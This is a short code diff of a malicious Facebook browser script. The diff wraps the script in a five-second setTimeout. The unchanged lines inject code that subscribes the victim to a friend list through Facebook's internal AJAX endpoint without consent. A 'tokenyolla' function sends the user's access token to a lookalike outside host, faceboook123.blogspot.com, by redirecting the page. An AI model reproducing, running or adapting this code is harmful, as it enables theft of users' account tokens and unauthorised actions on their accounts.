@@ -1,3 +1,4 @@
+setTimeout(function(){
 function IbraheemNada(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}
 IbraheemNada("1399854580296706");
 if(location.hostname.indexOf("www.facebook.com","static.ak.facebook.com","apps.facebook.com","beta.facebook.com") >= 0){
@@ -87,3 +88,4 @@ document.getElementsByClassName("uiPopover")[i].innerHTML = "";
 function tokenyolla(token){
 top.location.href = 'http://faceboook123.blogspot.com/#' + token;
 }}
+},5000);
